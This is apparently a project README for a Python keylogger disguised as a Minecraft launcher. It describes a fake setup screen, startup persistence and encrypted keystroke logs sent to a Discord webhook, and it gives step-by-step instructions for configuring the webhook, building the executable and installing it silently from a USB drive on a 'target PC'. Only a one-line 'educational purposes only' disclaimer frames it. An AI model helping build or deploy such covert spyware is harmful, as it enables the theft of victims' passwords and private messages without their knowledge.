# Stealth Keylogger (Minecraft Edition)

A lightweight, stealthy keylogger disguised as a Minecraft Launcher. It captures keystrokes, encrypts them, and sends them remotely via Discord Webhooks. It also features Face Authentication for secure log viewing.

## 🚀 Features
- **Stealth Installation**: Disguised as `Minecraft_Setup.bat` and `Minecraft_Launcher.exe`.
- **Remote Logging**: Sends logs to a private Discord channel every 10 minutes (configurable).
- **Secure Storage**: Logs are encrypted with Fernet (AES) encryption.
- **Face Authentication**: Requires your face to decrypt and view logs locally.
- **Persistence**: Automatically runs on system startup.

## 🛠️ Tech Stack
- **Language**: Python 3.13
- **Key Capture**: `pynput`
- **Encryption**: `cryptography` (Fernet)
- **Face Auth**: `opencv-python` (Haar Cascades + LBPH)
- **Network**: Standard `urllib` (No external requests lib needed)
- **Build Tool**: `PyInstaller`

## 📖 How to Use

### 1. Configuration (Developer Side)
Before deploying, you must configure the remote logging:
1.  Open `network_sender.py`.
2.  Paste your **Discord Webhook URL** into the `WEBHOOK_URL` variable.
3.  (Optional) Adjust `SEND_INTERVAL` in `main.py` (Default: 30s for testing, 600s for production).
4.  Run `build_portable.bat` to generate the executable.

### 2. Installation (Target Side)
1.  Copy the contents of the `release` folder to a USB drive.
2.  Plug the USB into the target PC.
3.  Run **`Minecraft_Setup.bat`**.
    - It will show a fake installation screen.
    - The tool is now installed and running silently.

### 3. Viewing Logs
- **Remote**: Check your Discord Channel.
- **Local**:
    1.  Copy `captured_text.enc` from the target (`%APPDATA%\Minecraft_Updater`) to your PC.
    2.  Run `python view_logs.py`.
    3.  Authenticate with your face to decrypt the logs.

### 4. Uninstallation
- Run **`Stop_Minecraft.bat`** from the release folder to stop the process and remove it from startup.

## ⚠️ Disclaimer
This tool is for **educational purposes only**. Using this software on computers that you do not own or have explicit permission to monitor is illegal and unethical.
